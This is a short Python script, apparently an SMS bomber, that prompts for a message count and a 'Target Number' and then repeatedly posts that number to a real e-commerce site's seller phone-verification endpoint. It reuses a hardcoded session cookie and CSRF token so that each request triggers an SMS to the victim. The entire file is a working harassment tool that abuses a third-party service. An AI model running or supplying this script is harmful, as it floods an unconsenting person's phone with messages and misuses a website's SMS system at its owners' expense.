from termcolor import colored
import requests, os



loop = int(input(colored(" \033[1;31mMessage count:\033[1;32m ")))
phone_number = input(colored("\033[1;31mEnter your Target Number: \033[1;32m"))
print()

def send_modified_request(phone_number):

	url = "https://mahsulot.com/sellers/?next=/sellers/profil"
	headers = {
	"Host": "mahsulot.com",
	"Cookie": "csrftoken=E5NhJAMM5Uv4tieNiewYLrlzmIVY6P1Wu2Trydi2noGo2RwwMyQMRvv1rPL31YEN; _ym_uid=1691417085540783261; _ym_d=1691417085; _ym_isad=2; _ym_visorc=w; sessionid=htjwbnx76oywfvrgqxq1skz6acxtfbsy",
	"Cache-Control": "max-age=0",
	"Sec-Ch-Ua": "",
	"Sec-Ch-Ua-Mobile": "?0",
	"Sec-Ch-Ua-Platform": '""',
	"Upgrade-Insecure-Requests": "1",
	"Origin": "https://mahsulot.com",
	"Content-Type": "application/x-www-form-urlencoded",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"Sec-Fetch-Site": "same-origin",
	"Sec-Fetch-Mode": "navigate",
	"Sec-Fetch-User": "?1",
	"Sec-Fetch-Dest": "document",
	"Referer": "https://mahsulot.com/sellers/?next=/sellers/profil",
	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "en-US,en;q=0.9"
	}

	payload = {
	"csrfmiddlewaretoken": "meweNVaJ5gdI4inucT8u1siMm5GGy9jAcbCoCyGZnKo2DRFdGdsi7wsercwLtiWr",
	"phone": phone_number
	}

	response = requests.post(url, headers=headers, data=payload)

	print(colored("\033[1;32mSMS Yuborildi "))
	
#	os.system("clear")
#	os.system("python web-application.py")
for i in range(1, loop+1):

	send_modified_request(phone_number)
